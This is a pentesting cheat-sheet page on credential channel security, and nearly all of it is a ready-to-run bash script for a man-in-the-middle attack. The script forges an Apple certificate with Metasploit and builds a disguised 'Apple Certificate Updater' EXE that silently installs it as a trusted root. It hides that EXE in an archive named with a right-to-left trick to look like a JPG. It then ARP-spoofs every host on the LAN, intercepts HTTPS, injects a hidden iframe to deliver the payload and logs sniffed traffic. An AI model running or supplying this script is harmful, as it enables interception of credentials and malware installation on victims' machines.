# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Man In The Middle

#### [BeEF ](https://beefproject.com/)& [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-beef-bettercap.sh
```

```bash
#!/bin/bash

# --- Color Codes ---
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
RESET='\e[0m'

color_print() {
  printf "${!1}%b${RESET}\n" "$2"
}

# --- Root Check ---
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT..."; exit 1; }

# --- Kill previous processes ---
pkill -f 'ngrok|ruby|msfconsole|apache2'

# --- Tool Check ---
for i in wget curl openssl metasploit-framework imagemagick apache2 jq bettercap arp-scan rar python3 python3-pip; do
    if ! command -v "$i" &>/dev/null; then
        color_print RED "[X] $i NOT installed!"
        apt install -y $i
    fi

    if ! command -v "pyinstaller" &>/dev/null; then
        pip3 install pyinstaller --break-system-packages
    fi
done

# --- Detect interface + LAN IP ---
IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
[[ -z "$IFACE" || -z "$LAN" ]] && { color_print RED "[X] Interface or IP detection failed"; exit 1; }

# --- Generate fake CA ---
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS apple.com;run;exit"
CERT_CRT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.crt" -printf "%f\n" | head -n 1)
CERT_KEY=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.key" -printf "%f\n" | head -n 1)
cp "$CERT_CRT" "/var/www/html/apple.crt"

# --- Download and Process Image ---
wget "https://www.apple.com/v/iphone-16-pro/f/images/overview/product-viewer/iphone-pro/all_colors__fdpduog7urm2_large_2x.jpg" -O /tmp/apple.jpg
convert "/tmp/apple.jpg" -define icon:auto-resize=96 "/tmp/apple.ico"

# --- Generate EXE Installer for CA ---
cat > /tmp/cert_installer.py << EOF
import os, subprocess, tempfile, base64

crt = """$(base64 -w0 /var/www/html/apple.crt)"""
path = os.path.join(tempfile.gettempdir(), "apple.crt")
with open(path, "wb") as f:
    f.write(base64.b64decode(crt))

try:
    subprocess.call(["certutil", "-addstore", "-f", "Root", path])
except:
    pass
EOF

rm -rf "~/dist"
pyinstaller --onefile --noconfirm --icon "/tmp/apple.ico" "/tmp/cert_installer.py"
cp -f "~/dist/cert_installer.exe" "/tmp/apple_update.exe"

# --- SFX Packing ---
cat > /tmp/sfx.txt << EOF
Setup=apple_update.exe
Silent=1
Overwrite=1
Title=Apple Certificate Updater
EOF
rar a -sfx -z"/tmp/sfx.txt" "/var/www/html/apple_update-%E2%80%AEexe.jpg" "/tmp/apple_update.exe" /tmp/apple.jpg

# --- Serve the cert over HTTP ---
service apache2 start

# --- Scan network ---
color_print CYAN "[*] Scanning LAN to find targets..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)
[[ -z "$TARGETS" ]] && { color_print RED "[X] No targets found."; exit 1; }

# --- Run Bettercap ---
color_print GREEN "[*] Starting Bettercap MITM attack..."
bettercap -iface "$IFACE" -eval "\
set arp.spoof.targets $TARGETS; \
set arp.spoof.internal true; \
set https.proxy.engine true; \
set https.proxy.sslstrip false; \
set https.proxy.cert $CERT_CRT; \
set https.proxy.key $CERT_KEY; \
set http.proxy.injecthtml '<iframe src=\"http://$LAN/apple_update-%E2%80%AEexe.jpg\" width=0 height=0 style=\"display:none\"></iframe>'; \
set net.sniff.verbose true; \
set net.sniff.output /tmp/bettercap.log; \
net.sniff on; http.proxy on; https.proxy on; arp.spoof on"
```

_Run & Execute_

```bash
sudo chmod +x mitm-beef-bettercap.sh;sudo ./mitm-beef-bettercap.sh
```
